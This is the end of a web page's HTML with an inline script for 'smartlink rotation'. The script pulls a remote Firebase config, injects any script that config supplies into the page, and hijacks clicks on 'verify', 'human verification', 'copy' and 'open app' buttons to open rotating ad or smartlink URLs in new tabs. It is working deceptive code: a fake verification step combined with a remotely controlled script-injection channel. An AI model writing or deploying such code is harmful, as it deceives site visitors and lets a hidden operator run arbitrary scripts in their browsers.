    <!-- 🔥 ADMIN-CONTROLLED SMARTLINK ROTATION (START HUMAN VERIFICATION ONLY) 🔥 -->
    <script>
      const FIREBASE_CTRL = "https://sws-player-default-rtdb.firebaseio.com/sws_control.json";

      let verifyLinksQueue = [
        "https://uplcm.com/4/12147723"
      ];
      let copyButtonLink = "";

      fetch(FIREBASE_CTRL + "?_=" + Date.now())
        .then(res => res.json())
        .then(data => {
          if (!data) return;
          if (Array.isArray(data.verifySmartLinks) && data.verifySmartLinks.length > 0) {
            verifyLinksQueue = data.verifySmartLinks.filter(u => u && u.startsWith('http'));
          }
          if (data.copySmartLink && data.copySmartLink.startsWith('http')) {
            copyButtonLink = data.copySmartLink;
          }
          if (data.customWebScript && data.customWebScript.trim() !== '') {
            const range = document.createRange();
            const frag = range.createContextualFragment(data.customWebScript);
            document.body.appendChild(frag);
          }
        })
        .catch(() => {});

      let verifyClickStep = parseInt(sessionStorage.getItem('sws_v_step') || '0', 10);
      let copyClickDone = sessionStorage.getItem('sws_c_done') === '1';

      document.addEventListener('click', function(e) {
        const btn = e.target.closest('button, a');
        if (!btn) return;
        const text = (btn.innerText || '').toLowerCase();

        if (text.includes('start human verification') || text.includes('verify')) {
          if (verifyClickStep < verifyLinksQueue.length) {
            const targetUrl = verifyLinksQueue[verifyClickStep];
            if (targetUrl && targetUrl.startsWith('http')) {
              e.preventDefault();
              e.stopPropagation();
              verifyClickStep += 1;
              sessionStorage.setItem('sws_v_step', String(verifyClickStep));
              window.open(targetUrl, '_blank');
              return;
            }
          }
        }

        if ((text.includes('copy') || text.includes('open app')) && copyButtonLink) {
          if (!copyClickDone) {
            e.preventDefault();
            e.stopPropagation();
            copyClickDone = true;
            sessionStorage.setItem('sws_c_done', '1');
            window.open(copyButtonLink, '_blank');
          }
        }
      }, true);
    </script>
  </body>
